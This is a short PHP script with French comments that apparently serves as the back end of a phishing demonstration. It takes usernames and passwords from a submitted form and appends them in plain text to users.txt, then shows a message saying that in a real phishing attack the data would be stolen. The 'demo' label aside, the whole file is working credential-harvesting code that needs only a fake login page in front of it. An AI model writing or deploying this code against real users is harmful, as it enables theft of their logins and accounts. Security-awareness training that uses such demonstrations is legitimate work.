<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Ouvrir ou créer le fichier users.txt
    $file = fopen("users.txt", "a");

    // Écrire les données
    fwrite($file, "Email: " . $username . " | Mot de passe: " . $password . "\n");

    fclose($file);

    echo "<h2>Démonstration terminée !</h2>";
    echo "<p>Dans un vrai phishing, vos données seraient volées. Ici elles sont juste enregistrées pour la démo.</p>";
}
?>
